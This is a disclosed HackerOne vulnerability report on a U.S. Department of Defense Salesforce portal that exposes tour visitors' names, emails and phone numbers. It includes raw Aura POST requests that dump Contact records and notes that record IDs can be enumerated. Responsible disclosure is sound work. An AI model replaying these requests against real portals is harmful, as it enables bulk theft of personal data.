---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cleartext-storage-of-sensitive-information
  - env/web
  - vuln/info-disclosure
  - vuln/cors-misconfig
  - vuln/misconfiguration
  - impact/sensitive-data
  - trigger/cors-origin
substate: "resolved"
weakness: "Cleartext Storage of Sensitive Information"
enriched: true
body: true
date: 2024-03-22
submitted: 2023-12-22T03:08:41.886Z
bounty_usd: null
votes: 90
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "oxylis"
source: "https://hackerone.com/reports/2294930"
title: "███ leaking PII of tour visitors (names, email addresses, phone numbers) via misconfigured record permissions"
---
# ███ leaking PII of tour visitors (names, email addresses, phone numbers) via misconfigured record permissions

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 90 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2024-03-22

- Report: [https://hackerone.com/reports/2294930](https://hackerone.com/reports/2294930)
- CWE: Cleartext Storage of Sensitive Information
- Submitted: 2023-12-22T03:08:41.886Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Dear DoD team,

The ████████ is leaking a large amount of sensitive data, including **full names, email addresses and phone numbers**. These are accessible by any registered user, as there is no additional verification. 

Any registered user of the portal is able to gain access to records other users (most likely visitors using the platform to complete security checks).

The specific vulnerable objects presenting a risk are:

Contact
Account
AccountContactRelation

As the website states that over ████████ every year, the extent of this leak may be affecting hundreds of thousands of users.

████

Hope you find this report helpful - look forward to your feedback.

## Impact

Large-scale user PII leak.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Navigate to █████
2. Append the link to ██████████
3. Register a new user, verify via email
4. Log into the portal (if not automatically logged in after following link in email and setting new password)
5. Capture a POST request to the █████ endpoint, such as one below (containing the aura.token). This will return only 2000 records - however note that Salesforce Id's are sequential and can be easily enumerated via the GetRecord Aura controller.


POST ███████?r=3&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/1.1
Host: ███
Cookie: ███
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/█████████ Firefox/119.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: ██████████t=1703212778793
X-Sfdc-Page-Scope-Id: ab32d6b8-b3fc-4612-8bc1-3b0c8163e8f0
X-Sfdc-Request-Id: 251200000054548e63
X-Sfdc-Page-Cache: 44256e663456d3d8
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1336
Origin: █████████
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2283%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%228c568ef8-3954-4997-930c-542a81f9e8eb%22%2C%22publishedChangelistNum%22%3A61%2C%22audienceKey%22%3A%22cp38y0onxM9f4QchAW2Mkg%22%7D%2C%22version%22%3A%2259.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22Q0FGdjJNU2hrWnJiekVjWXdRVlJ4d08ySzBfZjVsY04wOG9fYlRpVWRXUEEyNDYuMTUuNS0zLjAuNA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22xUUH_isHmNQqCOJ9yNTV7A%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2F████%2Fs%2F%3Ft%3D1703212778793&aura.token=█████..█████████


6. Modify the request as follows and send:

POST ███?r=3&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/1.1
Host: ██████████
Cookie: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/██████ Firefox/119.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: ████t=1703212778793
X-Sfdc-Page-Scope-Id: ab32d6b8-b3fc-4612-8bc1-3b0c8163e8f0
X-Sfdc-Request-Id: 251200000054548e63
X-Sfdc-Page-Cache: 44256e663456d3d8
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 1141
Origin: █████████
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

message={"actions":[{"id":"123;a","descriptor":"███/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22Q0FGdjJNU2hrWnJiekVjWXdRVlJ4d08ySzBfZjVsY04wOG9fYlRpVWRXUEEyNDYuMTUuNS0zLjAuNA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22xUUH_isHmNQqCOJ9yNTV7A%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2F████████%2Fs%2F%3Ft%3D1703212778793&aura.token=█████████..██████████

7. Replace the value of the entityNameOrId field in the request body to test other objects (Account, AccountContactRelation, User etc)

## Suggested Mitigation/Remediation Actions
██████████
https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae
█████████

## Timeline

- **Report Filed**
- **2023-12-22** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **2023-12-22** @oxylis: Hey @redwingreaper , please have a look at the attached. Ignore the red 'login failed' message on the screen, that was due to me making a typo when logging in seconds ago. Hope everything is clear, but let me know if there's anything else you need.████
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **2023-12-22** @redwingreaper: Hello,

We appreciate your submission. We'll prioritize the handling of this report accordingly. Our next steps involve verifying with the system owners to ensure that this data is indeed confidential. We'll keep you informed once there are updates regarding this issue.

Should you have any inquiries, feel free to reach out.

Thank you once more for your support of the DoD Vulnerability Disclosure Program (VDP)!

Best regards,

The VDP Team
- **Report Triaged**
- **2023-12-22** @oxylis: @redwingreaper great to hear it's in hand. As always, happy to help!
- **2023-12-29** @agent-p1: Greetings!
@oxylis  Because of this report you have been selected as our Researcher of the Month. Would you like your name to be on the certificate that is tweeted out? If so, would you provide me your name for that? Do you have a twitter handle for us to tag you in? If you do not, or would not like to, then we would use you Hackerone username. Thank you!
Regards,
The DoD VDP team
- **2023-12-30** @oxylis: Hey @agent-p1 ,

Extremely honoured to say the least! 

Full name would be ████████ :)

I don't have an active Twitter account at the moment, but it would be super cool if you could link to my H1 page: ███

Again, thanks for the recognition, and look forward to working on the program again.

Best,
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
